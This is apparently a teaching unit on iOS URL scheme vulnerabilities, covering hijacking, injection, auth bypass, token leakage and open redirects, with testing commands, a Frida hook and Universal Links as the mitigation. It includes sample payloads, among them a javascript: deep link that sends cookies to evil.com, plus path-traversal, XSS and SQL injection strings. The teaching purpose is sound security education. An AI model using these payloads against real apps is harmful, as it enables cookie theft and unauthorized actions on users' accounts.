# Unit 7: iOS Vulnerabilities — Topic 3: URL Schemes

## Overview

**URL schemes** (also called custom URL schemes or deep links) allow iOS apps to be launched and receive data from other apps, web pages, or system actions. When improperly validated, URL schemes can be exploited for unauthorized actions, data theft, phishing, and business logic bypass.

---

## 1. URL Scheme Basics

```
URL SCHEME ARCHITECTURE:

REGISTRATION (Info.plist):
  <key>CFBundleURLTypes</key>
  <array>
    <dict>
      <key>CFBundleURLSchemes</key>
      <array>
        <string>myapp</string>        ← Custom scheme
        <string>myapp-payment</string> ← Payment scheme
      </array>
      <key>CFBundleURLName</key>
      <string>com.example.myapp</string>
    </dict>
  </array>

INVOCATION:
  myapp://                             → Launch app
  myapp://profile?user=123             → Open profile
  myapp://transfer?to=attacker&amt=100 → Transfer money!
  myapp://auth?token=xyz               → Pass auth token

SOURCES OF URL SCHEME CALLS:
  → Other apps (UIApplication.shared.open)
  → Safari (links in web pages)
  → QR codes
  → Push notifications
  → NFC tags
  → iMessage / email links
  → JavaScript in WebViews
```

---

## 2. URL Scheme Vulnerabilities

```
VULNERABILITY TYPES:

1. URL SCHEME HIJACKING:
   → Multiple apps can register same scheme
   → iOS doesn't guarantee which app handles it
   → Malicious app registers same scheme
   → Intercepts data meant for legitimate app
   
   ATTACK: Install app with "mybank://" scheme
   → User clicks mybank://transfer?to=acct&amount=1000
   → Malicious app receives the URL, extracts parameters

2. MISSING INPUT VALIDATION:
   → App processes URL parameters without sanitization
   → JavaScript injection via WebView
   → Path traversal in file operations
   → SQL injection if parameters hit database
   
   EXPLOIT:
   myapp://webview?url=javascript:document.location='https://evil.com/steal?c='+document.cookie
   myapp://open?file=../../../etc/passwd

3. AUTHORIZATION BYPASS:
   → Sensitive actions triggered via URL without auth
   → No confirmation for dangerous operations
   → Admin functions accessible via deep link
   
   EXPLOIT:
   myapp://admin/deleteUser?id=123
   myapp://settings/changePassword?new=hacked
   myapp://transfer?to=attacker&amount=99999

4. TOKEN LEAKAGE:
   → Auth tokens passed via URL scheme
   → Logged in system logs, referrer headers
   → Interceptable by other apps
   
   myapp://callback?access_token=secret_token_here
   → Token visible in URL, potentially logged

5. OPEN REDIRECT:
   → App opens URL from scheme parameter
   → Redirect to phishing page
   
   myapp://redirect?url=https://evil-phishing-site.com
```

---

## 3. Testing URL Schemes

```bash
# === DISCOVER URL SCHEMES ===

# From IPA (static analysis)
plutil -p Info.plist | grep -A5 "CFBundleURLSchemes"

# Using objection
objection -g com.example.app explore
> ios plist cat Info.plist

# Using Frida — monitor URL handling
```

```javascript
// Frida: Monitor URL scheme handling
Interceptor.attach(
    ObjC.classes.AppDelegate['- application:openURL:options:'].implementation, {
    onEnter: function(args) {
        var url = ObjC.Object(args[3]);
        console.log("[URL Scheme] Received: " + url.absoluteString());
        
        // Log all URL components
        console.log("  Scheme: " + url.scheme());
        console.log("  Host: " + url.host());
        console.log("  Path: " + url.path());
        console.log("  Query: " + url.query());
    },
    onLeave: function(retval) {
        console.log("  Handled: " + retval);
    }
});
```

```bash
# === SEND TEST URLs ===

# From Safari on device
# Navigate to: myapp://test?param=value

# From command line (via Safari)
# On device: uiopen "myapp://admin/panel"

# Using ADB-equivalent (idevice tools)
# Not directly supported — use Safari or another app

# FUZZ URL PARAMETERS:
# Test each parameter for:
# □ XSS: myapp://page?name=<script>alert(1)</script>
# □ SQLi: myapp://search?q=' OR 1=1--
# □ Path traversal: myapp://file?path=../../../../etc/passwd
# □ Open redirect: myapp://goto?url=https://evil.com
# □ IDOR: myapp://profile?user_id=OTHER_USER_ID
# □ Missing auth: myapp://admin/secret_function
```

---

## 4. Universal Links (Secure Alternative)

```
UNIVERSAL LINKS vs CUSTOM URL SCHEMES:

CUSTOM URL SCHEMES (INSECURE):
  → Any app can register same scheme
  → No ownership verification
  → Can be hijacked
  → Example: myapp://action

UNIVERSAL LINKS (SECURE):
  → HTTPS-based: https://example.com/app/action
  → Apple-Apple-App-Site-Association (AASA) file
  → Proves domain ownership
  → Only your app handles your domain's links
  → Cannot be hijacked by other apps

AASA FILE (hosted at domain root):
  https://example.com/.well-known/apple-app-site-association
  {
    "applinks": {
      "apps": [],
      "details": [{
        "appID": "TEAMID.com.example.app",
        "paths": ["/app/*", "/profile/*"]
      }]
    }
  }

SECURITY BENEFITS:
  ✓ Verified domain ownership
  ✓ No scheme hijacking possible
  ✓ HTTPS encryption on link
  ✓ Graceful web fallback
  ✗ Requires server configuration
  ✗ More complex to implement
```

---

## Summary Table

| Vulnerability | Risk | Test Method | Mitigation |
|--------------|------|-------------|-----------|
| Scheme hijacking | Data interception | Install competing app | Use Universal Links |
| Missing validation | Code injection | Fuzz parameters | Validate all input |
| Auth bypass | Unauthorized actions | Send action URLs | Require auth check |
| Token in URL | Credential theft | Monitor URL handling | Use secure callbacks |
| Open redirect | Phishing | Test redirect params | Whitelist URLs |

---

## Revision Questions

1. How do iOS URL schemes work and how are they registered?
2. What is URL scheme hijacking and why is it possible?
3. How do you discover and test URL schemes in an app?
4. What are Universal Links and how do they solve hijacking?
5. What input validation should be performed on URL scheme parameters?

---

*Previous: [02-keychain-vulnerabilities.md](02-keychain-vulnerabilities.md) | Next: [04-runtime-manipulation.md](04-runtime-manipulation.md)*

---

*[Back to README](../README.md)*
